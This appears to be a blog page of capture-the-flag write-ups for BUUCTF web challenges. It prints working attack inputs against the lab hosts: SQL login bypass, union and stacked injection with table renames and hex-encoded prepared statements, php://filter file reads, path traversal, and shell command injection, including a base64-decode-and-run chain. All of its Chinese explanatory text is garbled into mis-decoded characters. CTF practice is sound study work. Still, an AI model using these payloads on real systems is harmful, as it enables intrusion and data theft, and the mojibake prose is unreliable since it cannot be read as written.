                Âà∑È¢ò&amp;&amp;ÊâìÈù∂
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/buuctf%E5%88%B7%E9%A2%98/">buuctfÂà∑È¢ò</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 10, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    ÈòÖËØªÊó∂Èïø: 75 ÂàÜÈíü
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="buuctf">buuctf
</h1><h2 id="1ÊûÅÂÆ¢Â§ßÊåëÊàò-2019easysql">1„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]EasySQL
</h2><p>ËøõÂéªÁåúÈó≠ÂêàÊñπÂºè</p>
<p>ÂçïÂºïÂè∑Èó≠Âêà</p>
<p>Â∞ùËØï‰∏áËÉΩÂØÜÁ†ÅÁôªÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or true#
</span></span></span><span class="line"><span class="cl"><span class="s1">password=1&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="no">true</span><span class="c1">#
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="2ÊûÅÂÆ¢Â§ßÊåëÊàò-2019havefun">2„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Havefun
</h2><p>Êü•ÁúãÊ∫êÁ†ÅË¶Åget‰º†catÁöÑÂÄº‰∏∫dog</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cat=dog
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="3hctf-2018warmup">3„ÄÅ[HCTF 2018]WarmUp
</h2><p>Êü•ÁúãÊ∫êÁ†Åsource.php</p>
<p>ÁôΩÂêçÂçïÂè™Êúâsource.phpÂíåhint.php,Êñá‰ª∂ÂåÖÂê´‰º†fileÂèÇÊï∞,‰∏îÊúâ?Êà™Êñ≠</p>
<p>Êü•Áúãhint.php</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110165335659.png"
	width="1360"
	height="530"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110165335659_hu11899225416449626265.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110165335659_hu17279174614773837336.png 1024w"
	loading="lazy"
	
		alt="image-20250110165335659"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="615px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://347210bf-0468-4578-89c6-04af275f9312.node5.buuoj.cn:81/source.php?file=source.php?../../../../../ffffllllaaaagggg
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæÄ‰∏äË∑≥ÁõÆÂΩïÊü•Êâæ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110165958069.png"
	width="1260"
	height="740"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110165958069_hu12540316386684838051.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110165958069_hu9830676015277352496.png 1024w"
	loading="lazy"
	
		alt="image-20250110165958069"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="408px"
	
></p>
<h2 id="4actf2020-Êñ∞ÁîüËµõinclude">4„ÄÅ[ACTF2020 Êñ∞ÁîüËµõ]Include
</h2><p>È¢òÁõÆÊèêÁ§∫‰∫ÜÊñá‰ª∂ÂåÖÂê´ÔºåË¶ÅÊü•Áúãflag.phpÊñá‰ª∂</p>
<p>Áî®Âà∞php‰º™ÂçèËÆÆÂ∞ÅË£Ö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/read=convert.base64-encode/resource=xxx.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈ¢òÁõ¥Êé•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?file=php://filter/read=convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂Âêébase64Ëß£Á†Å</p>
<p>Â∞±ÂæóÂà∞flag</p>
<h2 id="5actf2020-Êñ∞ÁîüËµõexec">5„ÄÅ[ACTF2020 Êñ∞ÁîüËµõ]Exec
</h2><p>ÁÆÄÂçïÁöÑrce</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip;ls /
</span></span><span class="line"><span class="cl">ip;cd /;cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110173300406.png"
	width="805"
	height="355"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110173300406_hu14213091224796805184.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110173300406_hu5994490468352901404.png 1024w"
	loading="lazy"
	
		alt="image-20250110173300406"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="544px"
	
></p>
<h2 id="6gxyctf2019ping-ping-ping">6„ÄÅ[GXYCTF2019]Ping Ping Ping
</h2><p>Â∞ùËØï‰∫ÜÂ•Ω‰πÖÊÑüËßâflagÂêçÂ≠óË¢´ËøáÊª§‰∫ÜÔºåËøòÊúâÁ©∫Ê†ºËøáÊª§</p>
<p>ÂÖàÊü•Áúãindex.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://41313055-4ac6-4251-8b42-bee9bd416efc.node5.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9index.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110174908430.png"
	width="1270"
	height="550"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110174908430_hu9447829958966860064.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110174908430_hu13755547570792205052.png 1024w"
	loading="lazy"
	
		alt="image-20250110174908430"
	
	
		class="gallery-image" 
		data-flex-grow="230"
		data-flex-basis="554px"
	
></p>
<h3 id="ÊñπÊ≥ï‰∏ÄÂèòÈáèÊãºÊé•Â≠óÁ¨¶‰∏≤Â∞ÜaÁöÑÂÄºË¶ÜÁõñÁÑ∂ÂêéËøõË°åÁªïËøá">ÊñπÊ≥ï‰∏ÄÔºö<strong>ÂèòÈáèÊãºÊé•Â≠óÁ¨¶‰∏≤‚Äî‚ÄîÂ∞ÜaÁöÑÂÄºË¶ÜÁõñÔºåÁÑ∂ÂêéËøõË°åÁªïËøá</strong>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÊü•ÁúãÊ∫êÁ†ÅÂæóÂà∞flag</p>
<h3 id="ÊñπÊ≥ï‰∫åÂÜÖËÅîÊâßË°å"><strong>ÊñπÊ≥ï‰∫åÔºöÂÜÖËÅîÊâßË°å</strong>
</h3><p><em>ÂÜÖËÅîÂáΩÊï∞ÔºöÂ∞ÜÊåáÂÆöÁöÑÂáΩÊï∞‰ΩìÊèíÂÖ•Âπ∂Âèñ‰ª£ÊØè‰∏ÄÂ§ÑË∞ÉÁî®ËØ•ÂáΩÊï∞ÁöÑÂú∞Êñπ„ÄÇ</em></p>
<p>ÂèçÂºïÂè∑Âú®linux‰∏≠‰Ωú‰∏∫ÂÜÖËÅîÊâßË°åÔºåÊâßË°åËæìÂá∫ÁªìÊûú„ÄÇ‰πüÂ∞±ÊòØËØ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">cat</span><span class="w"> </span><span class="o">`</span><span class="n">ls</span><span class="o">`</span><span class="w"> </span><span class="o">//</span><span class="err">ÊâßË°å</span><span class="n">lsËæìÂá∫</span><span class="w"> </span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="err">Âíå</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">php</span><span class="w"> </span><span class="err">„ÄÇÁÑ∂ÂêéÂÜçÊâßË°å</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">php</span><span class="p">;</span><span class="n">cat</span><span class="w"> </span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">/?</span><span class="n">ip</span><span class="o">=</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">;</span><span class="n">cat</span><span class="err">$</span><span class="n">IFS</span><span class="err">$</span><span class="mi">9</span><span class="o">`</span><span class="n">ls</span><span class="o">`</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ÊñπÊ≥ï‰∏âshÂëΩ‰ª§Êù•ÊâßË°å"><strong>ÊñπÊ≥ï‰∏âÔºöshÂëΩ‰ª§Êù•ÊâßË°å</strong>
</h3><p>Âä†ÂØÜÂëΩ‰ª§
echo ‚Äúcat flag.php‚Äù | base64
Ëß£ÂØÜÂëΩ‰ª§Âπ∂ÊâßË°å
echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="7suctf-2019easysql">7„ÄÅ[SUCTF 2019]EasySQL
</h2><p>Â∞ùËØïÂæàÂ§öÈó≠ÂêàÊñπÂºèÈÉΩÂõûÊòænonono</p>
<p>Â∞ùËØïÂ†ÜÂè†Ê≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1;show databases;
</span></span><span class="line"><span class="cl">1;show tables;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•ÁúãÂà∞flagÂ∫îËØ•Âú®FlagË°®‰∏≠</p>
<p>ËæìÂÖ•Èùû0Êï∞Â≠ó&ndash;Êúâ‰ºöÊòæÔºåËæìÂÖ•0ÊàñÂ≠óÊØç&ndash;Ê≤°ÊúâÂõûÊòæ</p>
<p>Áî±Ê≠§ÂèØ‰ª•ÁåúÊµãÂêéÁ´Ø‰ª£Á†ÅÂê´Êúâ||ÊàñorËøêÁÆóÁ¨¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select command1 || command2 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÊÉÖÂÜµ‰∏ÄÔºöËã•command1‰∏∫Èùû0Êï∞Â≠óÔºåÂàôÁªìÊûú‰∏∫1„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÊÉÖÂÜµ‰∫åÔºöËã•command1‰∏∫0ÊàñÂ≠óÊØçÔºåcommand2‰∏∫Èùû0Êï∞Â≠óÔºåÂàôÁªìÊûú‰∏∫1„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÊÉÖÂÜµ‰∏âÔºöcommand1Âíåcommand2ÈÉΩ‰∏ç‰∏∫Èùû0Êï∞Â≠óÔºåÂàôÁªìÊûú‰∏∫0„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ÊñπÊ≥ï‰∏Ä‰ΩøÁî®-sql_mode-‰∏≠ÁöÑ-pipes_as_concat-ÂáΩÊï∞">ÊñπÊ≥ï‰∏ÄÔºö‰ΩøÁî® sql_mode ‰∏≠ÁöÑ PIPES_AS_CONCAT ÂáΩÊï∞
</h3><p>PIPES_AS_CONCATÔºöÂ∞Ü || ÊàñËøêÁÆóÁ¨¶ ËΩ¨Êç¢‰∏∫ ËøûÊé•Â≠óÁ¨¶ÔºåÂç≥Â∞Ü||ÂâçÂêéÊãºÊé•Âà∞‰∏ÄËµ∑„ÄÇ</p>
<p>select 1 || flag from FlagÁöÑÊÑèÊÄùÂ∞ÜÂèòÊàê ÂÖàÊü•ËØ¢1 ÂÜçÊü•ËØ¢ flagÔºåËÄå‰∏çÊòØÊü•ËØ¢1flag,Âè™ÊòØÊü•ËØ¢ÁöÑÁªìÊûú‰ºöÊãºÊé•Âà∞‰∏ÄËµ∑</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1;sql_mode=PIPES_AS_CONCAT;select 1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ÊñπÊ≥ï‰∫åÂà©Áî®ÈùûÈ¢ÑÊúüÊºèÊ¥ûËé∑Âèñflag">ÊñπÊ≥ï‰∫åÔºöÂà©Áî®ÈùûÈ¢ÑÊúüÊºèÊ¥ûËé∑Âèñflag
</h3><p>Ëã•ËæìÂÖ•1Ôºå1„ÄÇÈÇ£‰πàsqlËØ≠Âè•Â∞±ÂèòÊàê‰∫Ü select 1, 1 || flag from Flag„ÄÇÂÖ∂‰∏≠Áî± [1] Âíå [1 || flag] ‰∏§ÈÉ®ÂàÜÁªÑÊàêÔºåËÄåÈùû [1,1] || [flag]„ÄÇÈùûÈ¢ÑÊúüÊºèÊ¥ûÊòØÂà©Áî®Êï∞ÊçÆÂ∫ìÂØπÁ¨¶Âè∑Âà§Êñ≠ÁöÑ‰∏çÂáÜÁ°ÆÂΩ¢ÊàêÁöÑÊºèÊ¥û„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*,1
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËæìÂÖ• *Ôºå1 ÂêéÔºåsqlËØ≠Âè•Â∞±ÂèòÊàê‰∫Ü select * , 1 || flag from Flag„ÄÇ</p>
<p>ÂÖ∂‰∏≠ÂàÜ‰∏∫‰∏§ÈÉ®ÂàÜÔºö (1) select * from Flag(2) select 1 || flag from Flag„ÄÇ</p>
<h2 id="8ÊûÅÂÆ¢Â§ßÊåëÊàò-2019lovesql">8„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]LoveSQL
</h2><p>ÂçïÂºïÂè∑Èó≠Âêà</p>
<p>Â∞ùËØïËÅîÂêàÊ≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39; union select 1,database(),version()#
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁàÜÂá∫Êï∞ÊçÆÂ∫ìÂêçÊòØgeek</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,group_concat(schema_name) from
</span></span><span class="line"><span class="cl">information_schema.schemata#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables
</span></span><span class="line"><span class="cl">where table_schema=database()#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,group_concat(column_name)from
</span></span><span class="line"><span class="cl">information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password)from
</span></span><span class="line"><span class="cl">l0ve1ysq1)#
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÊü•ÁúãÊ∫êÁ†ÅÂ∞±ÂæóÂà∞flag</p>
<h2 id="9Âº∫ÁΩëÊùØ-2019Èöè‰æøÊ≥®">9„ÄÅ[Âº∫ÁΩëÊùØ 2019]Èöè‰æøÊ≥®
</h2><p>Èó≠ÂêàÊñπÂºè‰∏∫ÂçïÂºïÂè∑</p>
<p>ÂêéÈù¢ËÅîÂêàÊü•ËØ¢ÂõûÊòæ‰∫ÜËøáÊª§ÁöÑÂ≠óÁ¨¶</p>
<p>Áî®Â†ÜÂè†Ê≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show databases;#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show tables;#
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âá∫Êù•‰∏§‰∏™Ë°®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;; show columns from words;#
</span></span><span class="line"><span class="cl">1&#39;; show columns from `1919810931114514`;#
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôËæπÊ≥®ÊÑèÊï∞Â≠óË¶ÅÁî®`ÂèçÂºïÂè∑ÂåÖËµ∑Êù•</p>
<p>Êï∞Â≠óË°®‰∏≠Êúâflag</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="err">ÔºåÈÄöËøá</span> <span class="n">rename</span> <span class="err">ÂÖàÊää</span> <span class="n">words</span> <span class="err">Ë°®ÊîπÂêç‰∏∫ÂÖ∂‰ªñÁöÑË°®Âêç„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="err">ÔºåÊää</span> <span class="mi">1919810931114514</span> <span class="err">Ë°®ÁöÑÂêçÂ≠óÊîπ‰∏∫</span> <span class="n">words</span> <span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">3</span> <span class="err">ÔºåÁªôÊñ∞</span> <span class="n">words</span> <span class="err">Ë°®Ê∑ªÂä†Êñ∞ÁöÑÂàóÂêç</span> <span class="n">id</span> <span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">4</span><span class="err">ÔºåÂ∞Ü</span> <span class="n">flag</span> <span class="err">ÊîπÂêç‰∏∫</span> <span class="n">data</span> <span class="err">„ÄÇ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="err">‚Äô</span><span class="p">;</span><span class="n">rename</span> <span class="n">tables</span> <span class="n">words</span> <span class="n">to</span> <span class="n">words1</span><span class="p">;</span><span class="n">rename</span> <span class="n">tables</span> <span class="mi">1919810931114514</span> <span class="n">to</span> <span class="n">words</span><span class="p">;</span> <span class="n">alter</span> <span class="n">table</span> <span class="n">words</span> <span class="n">change</span> <span class="n">flag</span> <span class="n">id</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span><span class="c1">#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">Â∞Ü</span><span class="n">wordsË°®ÂêçÊîπ‰∏∫words1</span><span class="err">Ôºå</span><span class="mi">1919810931114514</span><span class="err">Ë°®ÂêçÊîπ‰∏∫</span><span class="n">words</span><span class="err">ÔºåÂ∞ÜÁé∞Âú®ÁöÑ</span><span class="n">wordsË°®‰∏≠ÁöÑflagÂàóÂêçÊîπ‰∏∫id</span>
</span></span><span class="line"><span class="cl"><span class="err">ÁÑ∂ÂêéÁî®</span><span class="mi">1</span><span class="err">‚Äô</span> <span class="ow">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">#ÂæóÂà∞flag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëß£Ê≥ï‰∫å</p>
<p>Âõ†‰∏∫selectË¢´ËøáÊª§‰∫ÜÔºåÊâÄ‰ª•ÂÖàÂ∞Üselect * from <code>1919810931114514</code>ËøõË°å16ËøõÂà∂ÁºñÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂÖàÊää</span><span class="mi">0</span><span class="n">xselect</span> <span class="o">*</span> <span class="n">from</span> <span class="err">`</span><span class="mi">1919810931114514</span><span class="err">`</span> <span class="mi">16</span><span class="err">ËøõÂà∂ÁºñÁ†Å</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="err">‚Äô</span><span class="p">;</span><span class="n">SeT</span><span class="err">@</span><span class="n">a</span><span class="o">=</span><span class="mh">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="p">;</span><span class="n">prepare</span> <span class="n">execsql</span> <span class="n">from</span> <span class="err">@</span><span class="n">a</span><span class="p">;</span><span class="n">execute</span> <span class="n">execsql</span><span class="p">;</span><span class="c1">#</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SELECTÂèØ‰ª•Âú®‰∏ÄÊù°ËØ≠Âè•ÈáåÂØπÂ§ö‰∏™ÂèòÈáèÂêåÊó∂ËµãÂÄº</span><span class="p">,</span><span class="err">ËÄå</span><span class="n">SETÂè™ËÉΩ‰∏ÄÊ¨°ÂØπ‰∏Ä‰∏™ÂèòÈáèËµãÂÄº</span><span class="err">ÔºåÂ¶Ç‰∏ãÔºö</span>
</span></span><span class="line"><span class="cl"><span class="err">Â§çÂà∂‰ª£Á†Å</span> <span class="err">‰ª£Á†ÅÂ¶Ç‰∏ã</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">SELECT</span> <span class="err">@</span><span class="n">VAR1</span><span class="o">=</span><span class="err">‚Äò</span><span class="n">Y</span><span class="err">‚Äô</span><span class="p">,</span><span class="err">@</span><span class="n">VAR2</span><span class="o">=</span><span class="err">‚Äò</span><span class="n">N</span><span class="err">‚Äô</span>
</span></span><span class="line"><span class="cl"><span class="err">‚Äì</span> <span class="err">ËÄå</span><span class="n">SETË¶ÅËææÂà∞ÂêåÊ†∑ÁöÑÊïàÊûú</span><span class="err">ÔºåÈúÄË¶ÅÔºö</span>
</span></span><span class="line"><span class="cl"><span class="n">SET</span> <span class="err">@</span><span class="n">VAR1</span><span class="o">=</span><span class="err">‚Äò</span><span class="n">Y</span><span class="err">‚Äô</span>
</span></span><span class="line"><span class="cl"><span class="n">SET</span> <span class="err">@</span><span class="n">VAR2</span><span class="o">=</span><span class="err">‚Äò</span><span class="n">N</span><span class="err">‚Äô</span>
